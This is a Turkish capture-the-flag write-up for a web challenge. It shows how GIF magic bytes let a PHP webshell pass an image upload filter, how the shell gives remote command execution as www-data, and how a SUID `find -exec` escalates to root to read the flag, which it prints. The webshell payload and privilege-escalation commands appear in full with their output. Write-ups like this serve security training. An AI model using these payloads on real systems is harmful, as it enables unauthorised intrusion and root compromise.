# 🎯 Profil Resmi2 - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-SUID Privesc-purple?style=for-the-badge" alt="File Upload">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500

**Challenge URL:** http://68.183.213.255:9010

**Challenge Açıklaması:** "Agresif araçlar yasak."

---

## 🔍 Analiz

**Hedef:** Web uygulamasındaki dosya yükleme fonksiyonundaki kontrolleri bypass ederek PHP webshell yüklemek, ardından SUID binary ile root yetkisi alıp flag'i okumak

**Strateji:** Reconnaissance → GIF magic bytes ile file upload bypass → RCE → SUID privesc → Flag extraction

**İpuçları:**
- 🎯 Profil resmi yükleme sistemi → File upload vulnerability
- 🔍 İzin verilen formatlar: PNG, JPG, JPEG, GIF (Max: 5MB)
- 💡 Apache + PHP → GIF magic bytes ile MIME type bypass mümkün
- 🚨 Agresif araçlar yasak → Manuel exploit gerekli
- 🔑 500 puan → Zor seviye challenge, iki aşamalı (RCE + Privesc)

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Web Uygulamasını Keşfet**

İlk olarak hedef URL'i ziyaret edelim ve yapısını inceleyelim.

```bash
curl -v http://68.183.213.255:9010/
```

**Çıktı:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=cdcb764362632b50221f414ab0c81801; path=/
Content-Type: text/html; charset=UTF-8
```

**Analiz:**
- ✅ Apache 2.4.54 + PHP 7.4.33
- 💡 Profil resmi yükleme formu mevcut
- 🎯 POST method ile multipart/form-data, `upload.php` hedef
- 🔑 Session cookie alındı: `PHPSESSID=cdcb764362632b50221f414ab0c81801`

**HTML İçeriği:**
```html
<div class="info">
    <strong>👋 Hoşgeldin:</strong> user_7871<br>
    <strong>📝 İzin verilen formatlar:</strong> PNG, JPG, JPEG, GIF<br>
    <strong>📏 Maksimum boyut:</strong> 5MB
</div>
<form action="upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="profile_pic" accept="image/*" required>
    <button type="submit">Yükle ve Kaydet</button>
</form>
```

---

### 📤 **Adım 2: GIF Magic Bytes + PHP Webshell Yükle**

GIF formatı desteklendiği için magic bytes (`GIF89a`) ile PHP kodunu birleştirip `.php.gif` uzantısıyla yükleyelim.

```bash
# GIF magic bytes + PHP webshell oluştur
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif

# MIME type image/gif olarak yükle
curl -v -X POST http://68.183.213.255:9010/upload.php \
  -F "profile_pic=@shell.php.gif;type=image/gif" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```http
HTTP/1.1 302 Found
Location: index.php?success=1
```

**KRİTİK BULGULAR:**
- ✅ Dosya başarıyla yüklendi! (302 redirect → success)
- 💡 Sunucu GIF magic bytes'ı geçerli resim olarak kabul etti

---

### 📂 **Adım 3: Yüklenen Dosyanın Konumunu Bul**

Ana sayfaya dönerek yüklenen dosyanın yolunu bulalım.

```bash
curl -sL "http://68.183.213.255:9010/index.php?success=1" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response (ilgili kısım):**
```html
<div class="message success">✅ Profil resminiz başarıyla güncellendi!</div>
<img src="uploads/user_7871/shell.php.gif" class="profile-pic"
          onclick="window.open(this.src, '_blank')"
          title="Vesikalik">
```

**ANALİZ:**
- ✅ Dosya yolu bulundu: `uploads/user_7871/shell.php.gif`
- 💡 Kullanıcı bazlı klasör yapısı: `uploads/{username}/`
- 🎯 `.php.gif` uzantısıyla yüklendi ve PHP olarak çalışacak

---

### 🚀 **Adım 4: Shell'i Çalıştır - RCE Doğrula**

```bash
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=id" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```
GIF89a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**ANALİZ:**
- ✅ **RCE ELDE EDİLDİ!** 🎉
- 💡 GIF header `GIF89a` çıktının başında görünüyor (zararsız)
- 🎯 `www-data` kullanıcısı olarak komut çalıştırabiliyoruz

---

### 🗺️ **Adım 5: Sistemi Keşfet**

```bash
# Root dizinini listele
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=ls+/" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```
GIF89a
bin
boot
dev
entrypoint.sh
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```bash
# Flag dosyası ara
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=find+/+-name+'flag*'+2>/dev/null" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response (ilgili kısım):**
```
/var/www/html/flag.txt
/root/flag.txt
```

**ANALİZ:**
- 💡 İki flag dosyası bulundu
- 🎯 `/var/www/html/flag.txt` → fake flag (www-data okuyabilir)
- 🔑 `/root/flag.txt` → gerçek flag (root yetkisi gerekli)

---

### 🎭 **Adım 6: Fake Flag - Root Gerekiyor**

```bash
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=cat+/var/www/html/flag.txt" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```
GIF89a
PITO{fake_fl4g_you_need_root_access_hint_find_suid}
```

```bash
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=cat+/root/flag.txt" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```
GIF89a

```

**ANALİZ:**
- ❌ `/root/flag.txt` → erişim yok (www-data yetersiz)
- 💡 Fake flag ipucu veriyor: **"hint_find_suid"**
- 🎯 SUID binary ile privilege escalation gerekiyor!

---

### 🔑 **Adım 7: SUID Binary'leri Bul**

```bash
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=find+/+-perm+-4000+-type+f+2>/dev/null" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```
GIF89a
/bin/su
/bin/umount
/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/sudo
```

**ANALİZ:**
- ✅ `/usr/bin/find` → SUID bit set! 🎯
- 💡 GTFOBins'te `find` ile root yetki yükseltme mevcut
- 🔑 `find -exec` ile herhangi bir komutu root olarak çalıştırabiliriz

---

### 💥 **Adım 8: SUID find ile Privesc → Flag Oku**

```bash
curl -s "http://68.183.213.255:9010/uploads/user_7871/shell.php.gif?cmd=/usr/bin/find+/+-maxdepth+0+-exec+cat+/root/flag.txt+\;" \
  -b "PHPSESSID=cdcb764362632b50221f414ab0c81801"
```

**Response:**
```
GIF89a
PITO{pr1v_3sc_su1d_f1nd_r00t_pwn3d_2025}
```

**ANALİZ:**
- ✅ **FLAG BULUNDU!** 🎉🎉🎉
- 💡 `/usr/bin/find` SUID sayesinde `-exec` parametresi root olarak çalıştı
- 🎯 `cat /root/flag.txt` root yetkisiyle okundu
- 🚩 **Flag:** `PITO{pr1v_3sc_su1d_f1nd_r00t_pwn3d_2025}`

---

## 🚩 **FLAG**
```
PITO{pr1v_3sc_su1d_f1nd_r00t_pwn3d_2025}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">📁<br><b>echo</b><br><sub>Magic bytes injection</sub></td>
<td align="center">🐚<br><b>bash</b><br><sub>Command line</sub></td>
<td align="center">🔧<br><b>find</b><br><sub>SUID privesc</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Profil Resmi2 Challenge
       ↓
🌐 Web uygulamasını keşfet
   → Apache 2.4.54 + PHP 7.4.33
   → Profil resmi yükleme formu
   → İzin verilen: PNG, JPG, JPEG, GIF
   → Session: PHPSESSID alındı
       ↓
📤 GIF magic bytes + PHP webshell
   → GIF89a header + <?php system() ?>
   → shell.php.gif yüklendi (MIME: image/gif)
   → 302 redirect → success! ✅
   → Dosya yolu: uploads/user_7871/shell.php.gif
       ↓
🚀 Shell çalıştır
   → shell.php.gif?cmd=id
   → uid=33(www-data) ✅ RCE ELDE EDİLDİ!
       ↓
🗺️ Sistemi keşfet
   → find / -name 'flag*'
   → /var/www/html/flag.txt → FAKE FLAG
   → /root/flag.txt → erişim yok (root gerekli)
       ↓
🔑 SUID binary keşfi
   → find / -perm -4000 -type f
   → /usr/bin/find → SUID set! ✅
       ↓
💥 GTFOBins → SUID find privesc
   → /usr/bin/find / -maxdepth 0 -exec cat /root/flag.txt \;
   → Root olarak çalıştı ✅
       ↓
✅ FLAG: PITO{pr1v_3sc_su1d_f1nd_r00t_pwn3d_2025}
```
